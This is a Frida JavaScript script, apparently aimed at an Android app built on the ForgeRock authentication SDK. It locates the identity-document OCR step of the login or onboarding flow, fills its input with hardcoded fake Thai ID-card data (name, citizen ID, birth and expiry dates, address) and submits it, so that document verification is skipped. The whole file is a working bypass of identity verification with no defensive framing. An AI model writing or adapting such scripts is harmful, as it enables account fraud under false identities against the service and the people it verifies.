// Frida Node Injector v2 — OCR Unblock
// Fixed: skip verification (getValue doesn't exist), add completion marker

Java.perform(function () {
    console.log("[INJECT] === OCR Node Injector v2 ===");

    var MOCK_OCR_DATA = JSON.stringify({
        thaiFirstName: "สมใจ",
        thaiLastName: "ใจดี",
        englishTitle: "Miss",
        englishFirstName: "Somjai",
        englishLastName: "Jaidee",
        citizenId: "3872637115880",
        dateOfBirth: "15 Jan. 1992",
        dateOfIssue: "21 Aug. 2023",
        dateOfExpiry: "21 Aug. 2032",
        address: "888 หมู่ที่ 8 ต.ทดสอบ อ.ทดสอบ จ.กรุงเทพฯ"
    });

    var TextInputCallback = Java.use("org.forgerock.android.auth.callback.TextInputCallback");
    var ChoiceCallback = Java.use("org.forgerock.android.auth.callback.ChoiceCallback");
    var foundNode = false;

    Java.choose("org.forgerock.android.auth.Node", {
        onMatch: function (node) {
            if (foundNode) return;
            try {
                var stage = node.getStage();
                console.log("[INJECT] Node stage: " + stage);
                if (stage !== "OCR") return;

                foundNode = true;
                console.log("[INJECT] *** OCR NODE FOUND ***");

                // Inspect & fill callbacks
                var callbacks = node.getCallbacks();
                var count = callbacks.size();
                console.log("[INJECT] Callbacks: " + count);

                for (var i = 0; i < count; i++) {
                    var cb = callbacks.get(i);
                    var cls = cb.$className;
                    console.log("[INJECT] [" + i + "] " + cls);

                    if (cls === "org.forgerock.android.auth.callback.TextInputCallback") {
                        var tic = Java.cast(cb, TextInputCallback);
                        tic.setValue(MOCK_OCR_DATA);
                        console.log("[INJECT] *** TextInputCallback SET (len=" + MOCK_OCR_DATA.length + ") ***");
                    }

                    if (cls === "org.forgerock.android.auth.callback.ChoiceCallback") {
                        var cc = Java.cast(cb, ChoiceCallback);
                        cc.setSelectedIndex(0);
                        console.log("[INJECT] *** ChoiceCallback SET to proceed ***");
                    }
                }

                // Get context
                var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
                console.log("[INJECT] Context: OK");

                // Create NodeListener — try multiple approaches
                var listener = null;

                // Approach 1: Find existing NodeListener in memory
                Java.choose("org.forgerock.android.auth.NodeListener", {
                    onMatch: function (l) {
                        if (listener === null) {
                            listener = l;
                            console.log("[INJECT] Found existing NodeListener");
                        }
                    },
                    onComplete: function () {}
                });

                if (listener !== null) {
                    console.log("[INJECT] Using existing listener: OK");
                } else {
                    console.log("[INJECT] No existing listener found, trying null...");
                    // Node.next() might work with null listener
                    // The server still receives the callbacks
                    // The NPE on listener callback is caught by try/catch
                }

                // SUBMIT
                console.log("[INJECT] *** CALLING Node.next() ***");
                node.next(context, listener);
                console.log("[INJECT] *** Node.next() COMPLETED ***");

            } catch (e) {
                console.log("[INJECT] ERROR: " + e);
                console.log("[INJECT] Stack: " + (e.stack || "n/a"));
            }
        },
        onComplete: function () {
            if (!foundNode) console.log("[INJECT] No OCR Node found");
            console.log("[INJECT-COMPLETE] Script finished");
        }
    });
});
